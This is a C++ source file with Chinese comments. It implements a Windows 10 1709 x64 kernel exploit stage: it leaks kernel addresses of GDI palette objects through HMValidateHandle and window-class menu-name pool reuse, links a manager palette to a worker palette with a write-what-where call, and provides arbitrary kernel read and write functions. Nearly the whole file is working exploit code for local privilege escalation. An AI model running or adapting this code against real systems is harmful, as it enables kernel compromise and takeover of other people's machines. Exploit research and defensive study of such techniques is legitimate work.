#include "bypass.h"

PGPALETTE managerPalette = NULL;
PGPALETTE workerPalette = NULL;

HPALETTE createPaletteofSize(int size) {
	// we alloc a palette which will have the specific size on the paged session pool. 
	if (size <= 0x90) {
		//LogMessage(L_ERROR, L"Bad size! can't allocate palette of size < 0x90!");
		std::cout << "[+] Bad size!!! failed" << std::endl;
		return 0;
	}
	int pal_cnt = (size - 0x90) / 4;
	int palsize = sizeof(LOGPALETTE) + (pal_cnt - 1) * sizeof(PALETTEENTRY);
	LOGPALETTE *lPalette = (LOGPALETTE*)malloc(palsize);
	memset(lPalette, 0x4, palsize);
	lPalette->palNumEntries = pal_cnt;
	lPalette->palVersion = 0x300;
	return CreatePalette(lPalette);
}
// 新开个页面, 使用platte实现writeOOB和readOOB
// platte replace bitmap
PGPALETTE leakPalettes()
{
	// 此函数用于泄露palettes的基地址

	// [+] 使用lpszMenuName去泄露他

	// [+] 分配 >= 0x1000 bytes的POOL overflow(LARGE POOL)

	// [+] 如果pool size < 0x1000 bytes, 相同的地址不会被重复使用.

	// [+] 利用不会重复使用的机制

	// [+] 流程:
	//		[+] 使用heap风水技术 分配可预测的Pool布局
	//		[+] 不断的alloc/free, 当其不相等的时候, 我们可以去预测下一个基地址
	PGPALETTE pGpalette = (PGPALETTE)malloc(sizeof(PGPALETTE));
	WNDCLASSEX wndClassEx = {};

	TCHAR lpszMenuName[0x68];	// 记住的0x68
	memset(lpszMenuName, 0x41, sizeof(lpszMenuName));

	wndClassEx.lpfnWndProc = DefWindowProc;
	wndClassEx.lpszClassName = TEXT("leakPwnd");
	wndClassEx.lpszMenuName = lpszMenuName;
	wndClassEx.cbSize = sizeof(WNDCLASSEX);

	// 先写不用相关结构体的
	DWORD dwCount = 0;	

	while (dwCount < 20)
	{
		if (!RegisterClassEx(&wndClassEx))	// 风水布局
		{
			std::cout << "[+] Register Class failed!!!" << std::endl;
			return NULL;
		}

		HWND hwndOne = CreateWindowEx(0, wndClassEx.lpszClassName, TEXT("WORDS"), 0, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, NULL, NULL, NULL, NULL);	// 这是已知的风水布局
		
		PTHRDESKHEAD tagWND = (PTHRDESKHEAD)pHmValidateHandle(hwndOne, 1);
		

		DWORD64 tagWNDAddress = (DWORD64)(tagWND->pSelf);	// 获取windows的内核地址

		DWORD64 userTagWND = (DWORD64)tagWND;
		
		// 这一部分和桌面堆的映射有关
		DWORD64 ulClientDelta = tagWNDAddress - userTagWND;	// 获取映射的偏移地址
		std::cout << "[+] userTagWND: " << std::hex <<userTagWND << std::endl;
		// 这里获取一个重要的名为CLS的结构体
		DWORD64 kernelCls = *(PDWORD64)(userTagWND + 0xa8);
		std::cout << "[+] kernelCls" << kernelCls << std::endl;
		DWORD64 lpszMenuNameFirstAddr = *(PDWORD64)(kernelCls - ulClientDelta + 0x98);	// 类似于线段获取基地址

		// 获取lpszMenuName的地址
		DestroyWindow(hwndOne);	// 分配个空隙, 给我进去

		// 利用此分配布局
		UnregisterClass(wndClassEx.lpszClassName, NULL);	// 分配空隙

		// 继续分配布局
		if (!RegisterClassEx(&wndClassEx))	// 风水布局
		{
			std::cout << "[+] Register Class failed!!!" << std::endl;
		}

		HWND hwndTwo = CreateWindowEx(0, wndClassEx.lpszClassName, TEXT("WORDS"), 0, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, NULL, NULL, NULL, NULL);	// 这是已知的风水布局
		tagWND = (PTHRDESKHEAD)pHmValidateHandle(hwndTwo, 1);

		tagWNDAddress = (DWORD64)(tagWND->pSelf);	// 获取windows的内核地址
		userTagWND = (DWORD64)tagWND;

		// 这一部分和桌面堆的映射有关
		ulClientDelta = tagWNDAddress - userTagWND;	// 获取映射的偏移地址

															// 这里获取一个重要的名为CLS的结构体
		kernelCls = *(PDWORD64)(userTagWND + 0xa8);

		DWORD64 lpszMenuNameSecondAddr = *(PDWORD64)(kernelCls - ulClientDelta + 0x98);	// 类似于线段获取基地址
		if (lpszMenuNameFirstAddr == lpszMenuNameSecondAddr)	// 说明找到了分配的东西
		{
			DestroyWindow(hwndTwo);	//
			UnregisterClass(wndClassEx.lpszClassName, NULL);

			pGpalette->_hpalette = (HPALETTE)createPaletteofSize(0xe0);
			pGpalette->_kobj_palette = lpszMenuNameFirstAddr;	// 基地址获取OK
			pGpalette->flag = 1;
			std::cout << "[+] Find it address at " << pGpalette->_kobj_palette << std::endl;
			return pGpalette;
		}
	
		DestroyWindow(hwndTwo);	//
		UnregisterClass(wndClassEx.lpszClassName, NULL);
		dwCount++;
	}
	return NULL;
}

/*
*	[+] 利用这个实现readOOB和writeOOB
*/
VOID bypassWithWindows10_1709_x64()
{
	std::cout << "[+] Ready Go!!! by pass" << std::endl;
	BOOL bFound = FindHMValidateHandle();
	if (!bFound) 
	{
		printf("Failed to locate HmValidateHandle, exiting\n");
	}

	DWORD64 managerPaletteAddr = NULL;
	DWORD64 workerPaletteAddr = NULL;
	
	// 泄露地址吧
	managerPalette = leakPalettes();
	workerPalette = leakPalettes();

	if (managerPalette == NULL || workerPalette == NULL)
	{
		std::cout << "[+] LeakPalette failed" << std::endl;
		return;
	}

	managerPaletteAddr = (managerPalette->_kobj_palette + 0x78);
	workerPaletteAddr = (workerPalette->_kobj_palette + 0x78);
	std::cout << "[+] managerPalette's kernel address is: " << managerPaletteAddr << std::endl;
	std::cout << "[+] workerPalette kernel address is: " << workerPaletteAddr << std::endl;

	// 获取writeOOB和readOOB
	// there need some tips and change
	write_what_where_qword((DWORD64)managerPaletteAddr, (DWORD64)workerPaletteAddr);
}

// readOOB 和 writeOOB需要通过调试来解决可靠性.

/*
* readOOB:
*	[+] 对任意地址进行读操作
*	[+] whereRead: 读的地址
*	[+] whatValue: 获取读的值
*	[+] len: 读的长度(BYTE)
*/
VOID readOOB(DWORD64 whereRead, BYTE* whatValue, int len)
{
	SetPaletteEntries(managerPalette->_hpalette, 0, sizeof(PVOID) / sizeof(PALETTEENTRY), (PALETTEENTRY*)&whereRead);
	GetPaletteEntries(workerPalette->_hpalette, 0, len /sizeof(PALETTEENTRY), (PALETTEENTRY*)whatValue);
}

/*
* writeOOB:
*	[+] 对任意地址进行写操作
*	[+] whereRead: 写的地址
*	[+] whatValue: 写入的值
*/
VOID writeOOB(DWORD64 whereWrite, BYTE* whatValue, int len)
{
	// 使用hmWorker对其进行写操作
	SetPaletteEntries(managerPalette->_hpalette, 0, sizeof(PVOID) / sizeof(PALETTEENTRY), (PALETTEENTRY*)&whereWrite);
	SetPaletteEntries(workerPalette->_hpalette, 0, len / sizeof(PALETTEENTRY), (PALETTEENTRY*)whatValue);
}